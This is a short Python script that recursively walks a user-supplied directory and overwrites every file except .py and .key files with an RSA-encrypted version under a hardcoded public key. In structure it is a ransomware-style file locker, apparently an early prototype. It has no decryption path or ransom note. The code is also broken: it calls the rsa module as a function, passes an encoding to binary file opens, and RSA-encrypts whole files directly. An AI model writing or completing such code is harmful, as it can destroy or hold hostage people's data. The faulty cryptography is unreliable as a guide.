from cryptography.hazmat.primitives.asymmetric import rsa
from pathlib import Path
import argparse

#parsing for directory to encrypt
parser = argparse.ArgumentParser()
parser.add_argument("--path", type = str, required = True)
args = parser.parse_args()
directory = Path(args.path)

#generate key
key = ("aMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCAaqHbezjgaRc3ReKsyqEP6kisDLIcs85ipRfj5B"
       "C5AawWazNaZvwjYiLetoZNxots+OufFclOtjU/Plqw+lwZD9NmgdUyFiLq4cgM22uZhRwewhkKbyZU2"
       "Xn0yuX5SVEc9OkQFFlNca4jFfrttS2t5UAAaVC+hHOapQDaHFI/wIDAQAB")
cipher = rsa(key)

#put files into array
def get_files(directory):
    files = []
    for file in directory.rglob("*"):
        if file.suffix == ".py" or file.suffix == ".key":
            continue
        elif file.is_file():
            files.append(file)
    return files

#encrypts files
def encrypt_files(files):
    for file in files:
        with open(file, 'rb', encoding = 'utf-8') as f:
            encrypted = cipher.encrypt(f.read())
        
        with open(file, 'wb', encoding = 'utf-8') as f:
            f.write(encrypted)

